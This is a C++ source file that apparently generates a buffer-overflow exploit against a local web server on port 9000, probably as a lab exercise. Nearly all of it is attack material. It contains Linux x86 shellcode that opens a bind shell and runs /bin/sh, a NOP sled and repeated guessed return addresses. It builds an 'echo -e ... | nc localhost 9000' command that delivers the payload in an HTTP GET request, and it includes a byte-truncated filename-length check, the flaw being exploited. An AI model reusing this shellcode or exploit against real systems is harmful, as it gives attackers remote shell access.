#include <stdio.h>
#include <stdlib.h>
#include <cstdlib>
#include <fstream>
#include <iostream>
#include <vector>
#include <map>
#include <queue>
#include <cmath>
using namespace std;

typedef unsigned char byte;

char shellcode[] =
"\\x31\\xc0"			// xorl		%eax,%eax
"\\x50"				// pushl	%eax
"\\x40"				// incl		%eax
"\\x89\\xc3"			// movl		%eax,%ebx
"\\x50"				// pushl	%eax
"\\x40"				// incl		%eax
"\\x50"				// pushl	%eax
"\\x89\\xe1"			// movl		%esp,%ecx
"\\xb0\\x66"			// movb		$0x66,%al
"\\xcd\\x80"			// int		$0x80
"\\x31\\xd2"			// xorl		%edx,%edx
"\\x52"				// pushl	%edx
"\\x66\\x68\\x2b\\x0d"		// pushw	$0xd213
"\\x43"				// incl		%ebx
"\\x66\\x53"			// pushw	%bx
"\\x89\\xe1"			// movl		%esp,%ecx
"\\x6a\\x10"			// pushl	$0x10
"\\x51"				// pushl	%ecx
"\\x50"				// pushl	%eax
"\\x89\\xe1"			// movl		%esp,%ecx
"\\xb0\\x66"			// movb		$0x66,%al
"\\xcd\\x80"			// int		$0x80
"\\x40"				// incl		%eax
"\\x89\\x44\\x24\\x04"		// movl		%eax,0x4(%esp,1)
"\\x43"				// incl		%ebx
"\\x43"				// incl		%ebx
"\\xb0\\x66"			// movb		$0x66,%al
"\\xcd\\x80"			// int		$0x80
"\\x83\\xc4\\x0c"			// addl		$0xc,%esp
"\\x52"				// pushl	%edx
"\\x52"				// pushl	%edx
"\\x43"				// incl		%ebx
"\\xb0\\x66"			// movb		$0x66,%al
"\\xcd\\x80"			// int		$0x80
"\\x93"				// xchgl	%eax,%ebx
"\\x89\\xd1"			// movl		%edx,%ecx
"\\xb0\\x3f"			// movb		$0x3f,%al
"\\xcd\\x80"			// int		$0x80
"\\x41"				// incl		%ecx
"\\x80\\xf9\\x03"			// cmpb		$0x3,%cl
"\\x75\\xf6"			// jnz		<shellcode+0x40>
"\\x52"				// pushl	%edx
"\\x68\\x6e\\x2f\\x73\\x68"		// pushl	$0x68732f6e
"\\x68\\x2f\\x2f\\x62\\x69"		// pushl	$0x69622f2f
"\\x89\\xe3"			// movl		%esp,%ebx
"\\x52"				// pushl	%edx
"\\x53"				// pushl	%ebx
"\\x89\\xe1"			// movl		%esp,%ecx
"\\xb0\\x0b"			// movb		$0xb,%al
"\\xcd\\x80"			// int		$0x80
;



int main(int argc, char *argv[]){
	//int myN = atoi(argv[1]); **
	int sCount = 1;
	int eCount = 1;
	//char nop[] = "a";
	string nop = "\\x90";
	string ra = "\\x28\\xd5\\xff\\xff"; // FFFFD528
	// FFFFd528
	int nopSIZE = 5;
	string namething;
	string ras;
	//int n =  atoi(argv[1]); **
	ras = "GET /";
	namething = "";
	string filename;
	filename = "";
	//nop = nop + nop;

	//int numberNOPS = (0) + (256*n/nopSIZE);

	/*
	int numberNOPS = (90/nopSIZE) + (256*n);
	*/

	/*
	Actually, the 99 will most likely have to change since I still need to add shellcode and return address guesses.
	*/
	// printf("%d\n", numberNOPS % (int) (pow(2, 8)) ); // Just for checking, not useful...
	int raSize=50;
	int nopSize = 500;
	int size;
	for(int i= 0; i < raSize; i++){
		ras = ras + ra;
		size= size+ 4;

	}
	for(int i= 0; i < nopSize; i++){
		namething = namething + nop;
		size= size+1;
	}

	/*
		namething = namething + ".html" + " HTTP";
		This and changing numberNOPS to have the first number be less than 100 was able to crash the server!
	*/
	//namething = namething + shellcode + "4287654332"+ ".html" + " HTTP" ;
	int comp = 4287654192;
	int thin = 1;

	namething = "echo -e \"" + ras + namething + shellcode + ".html" + " HTTP" + "\"" + " | nc localhost 9000" ;
	size = size +92;
	//printf("%d\n", namething.length());

	//printf("Passing the test? should be less than 100 %d\n", (namething.length()%256));
	//printf("ACTUAL LENGTH %d\n", namething.length());
	cout << namething << endl;
	//printf("%d \n",size);
	//int remainder = 256%size;
	//printf("%d",remainder);

 return 0;//EXIT_SUCCESS;
}


int check_filename_length(byte len) {
  if (len < 100) {
    return 1;
  }
  return 0;
}
